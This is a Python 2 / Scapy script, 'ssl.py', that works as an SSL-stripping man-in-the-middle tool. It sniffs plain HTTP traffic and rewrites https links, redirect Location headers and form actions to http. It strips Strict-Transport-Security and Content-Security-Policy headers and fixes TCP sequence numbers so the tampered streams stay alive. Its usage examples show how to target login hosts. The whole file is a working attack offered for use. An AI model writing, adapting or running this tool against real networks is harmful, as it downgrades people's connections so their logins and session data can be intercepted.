#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
ssl.py – “plug-and-play” SSL-stripper for Python-2.7 + Scapy 2.4.x
Turns every https:// reference in *plaintext* HTTP traffic into http://,
keeping sequence/ack numbers correct so the TCP streams stay healthy.
"""

from __future__ import print_function, absolute_import
import argparse, logging, re, signal, sys
from collections import defaultdict

from scapy.all import (
    conf, IP, IPv6, TCP, Raw,
    sniff, sendp,
)

# Logging setup
def setup_logging(verbose, quiet):
    if verbose and quiet:
        quiet = False
    lvl = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
    logging.basicConfig(level=lvl,
                        format="%(asctime)s [%(levelname).1s] %(message)s",
                        datefmt="%H:%M:%S")

log = logging.getLogger("sslstrip")

HTTPS_RE = re.compile(br"https://", re.I)
TAG_RE = re.compile(br'(?i)(href|src|action)=["\']https://')
DROP_HDRS = {b"strict-transport-security", b"content-security-policy"}
HDR_END_RE = re.compile(br"\r\n\r\n")
BODY_CAP = 131072  # 128 kB

class FlowState(object):
    __slots__ = ("c2s_delta", "s2c_delta")
    def __init__(self):
        self.c2s_delta = 0
        self.s2c_delta = 0

flows = defaultdict(FlowState)

def _kill_accept_encoding(req):
    out, delta = [], 0
    for line in req.split(b"\r\n"):
        if line.lower().startswith(b"accept-encoding:"):
            delta -= len(line) + 2
            continue
        out.append(line)
    return b"\r\n".join(out), delta

def _rewrite_hdr(resp):
    out, delta = [], 0
    lines = resp.split(b"\r\n")
    status_line = lines[0].lower()
    is_redirect = any(code in status_line for code in (b" 301", b" 302", b" 303"))

    for ln in lines:
        if not ln:
            out.append(ln)
            break
        key = ln.split(b":", 1)[0].lower()
        if key in DROP_HDRS:
            delta -= len(ln) + 2
            continue
        if is_redirect and key == b"location":
            nl = HTTPS_RE.sub(b"http://", ln, 1)
            delta += len(nl) - len(ln)
            ln = nl
        out.append(ln)

    remainder = resp.split(b"\r\n\r\n", 1)[1]
    return b"\r\n".join(out) + b"\r\n\r\n" + remainder, delta

def _rewrite_body(body):
    nb = HTTPS_RE.sub(b"http://", body)
    nb = TAG_RE.sub(lambda m: m.group(1) + b'="http://', nb)
    return nb, len(nb) - len(body)

def _adjust_tcp(pkt, seq_d, ack_d):
    if seq_d:
        pkt.seq = (pkt.seq + seq_d) & 0xffffffff
    if ack_d:
        pkt.ack = (pkt.ack + ack_d) & 0xffffffff

def _fwd(orig, payload, iface):
    p = orig.copy()
    p[Raw].load = payload
    if IP in p:
        p[IP].len = None
        p[IP].chksum = None
    if IPv6 in p:
        p[IPv6].plen = None
    p[TCP].chksum = None
    sendp(p, iface=iface, verbose=0)

def proc(pkt, iface, host_filter):
    if not pkt.haslayer(Raw) or not pkt.haslayer(TCP):
        return

    ip, tcp = pkt[IP], pkt[TCP]
    fkey = (ip.src, tcp.sport, ip.dst, tcp.dport)
    state = flows[fkey]

    # client → server
    if tcp.dport in (80, 8080, 8000):
        payload = str(pkt[Raw].load)
        if host_filter and not any(h.encode() in payload for h in host_filter):
            return

        if HDR_END_RE.search(payload):
            nreq, d = _kill_accept_encoding(payload)
            if d:
                log.info("[C→S] stripped Accept-Encoding (%+d bytes)", d)
                state.c2s_delta += d
                _adjust_tcp(tcp, 0, state.s2c_delta)
                _fwd(pkt, nreq, iface)
                return

        if state.s2c_delta:
            _adjust_tcp(tcp, 0, state.s2c_delta)
        _fwd(pkt, payload, iface)
        return

    # server → client
    if tcp.sport in (80, 8080, 8000):
        payload = str(pkt[Raw].load)
        if HDR_END_RE.search(payload[:4096]):
            head, body = payload.split(b"\r\n\r\n", 1)
            nhead, d1 = _rewrite_hdr(head + b"\r\n\r\n")
            nbody, d2 = body, 0
            if body and len(body) <= BODY_CAP and b"text/" in head.lower():
                nbody, d2 = _rewrite_body(body)

            delta = d1 + d2
            if delta:
                log.info("[S→C] rewrote %-15s (%+d bytes)", ip.dst, delta)
                state.s2c_delta += delta
                _adjust_tcp(tcp, 0, state.c2s_delta)
                _fwd(pkt, nhead + nbody, iface)
                return

        if state.c2s_delta or state.s2c_delta:
            _adjust_tcp(tcp, state.s2c_delta, state.c2s_delta)
        _fwd(pkt, payload, iface)

def main():
    epilog_txt = """\
Examples
--------
# 1) Strip all HTTPS upgrades crossing port 80 on iface *eth0*
sudo python2 ssl.py -i eth0 -v

# 2) Only tamper with selected hosts
sudo python2 ssl.py -i eth0 --hosts login.example.com,*.test.net

# 3) Target internal HTTP service on port 8080
sudo python2 ssl.py -i eth0 --bpf "tcp port 8080"
"""

    ap = argparse.ArgumentParser(
        prog="ssl.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="SSL-stripper for Python 2.7 + Scapy 2.4.x\n"
                    "Downgrades all https:// references in plain HTTP traffic.",
        epilog=epilog_txt)

    ap.add_argument("-i", "--iface", metavar="IFACE",
                    help="network interface to sniff & inject (default: Scapy’s conf.iface)")
    ap.add_argument("--bpf", default="tcp port 80", metavar="FILTER",
                    help="additional tcpdump-style BPF filter (AND-ed with port 80)")
    ap.add_argument("--hosts", metavar="LIST",
                    help="comma-separated hostnames (or *.wildcards) to restrict tampering")

    vq = ap.add_mutually_exclusive_group()
    vq.add_argument("-v", "--verbose", action="store_true",
                    help="enable verbose output")
    vq.add_argument("-q", "--quiet", action="store_true",
                    help="suppress normal output")

    args = ap.parse_args()

    iface = args.iface or conf.iface
    setup_logging(args.verbose, args.quiet)

    hosts = None
    if args.hosts:
        hosts = [h.strip().lower() for h in args.hosts.split(",") if h.strip()]

    try:
        if open("/proc/sys/net/ipv4/ip_forward").read().strip() != "1":
            log.warning("IP-forwarding disabled – MITM will break!")
    except IOError:
        pass

    log.info("SSL-strip on %s   filter=\"%s\"", iface, args.bpf)

    sniff(iface=iface,
          store=0,
          filter=args.bpf,
          prn=lambda p: proc(p, iface, hosts))

if __name__ == "__main__":
    if not conf.route.route("0.0.0.0")[2]:
        log.error("No default route – Scapy cannot send packets.")
        sys.exit(1)

    signal.signal(signal.SIGINT, lambda *_: sys.exit(0))
    main()
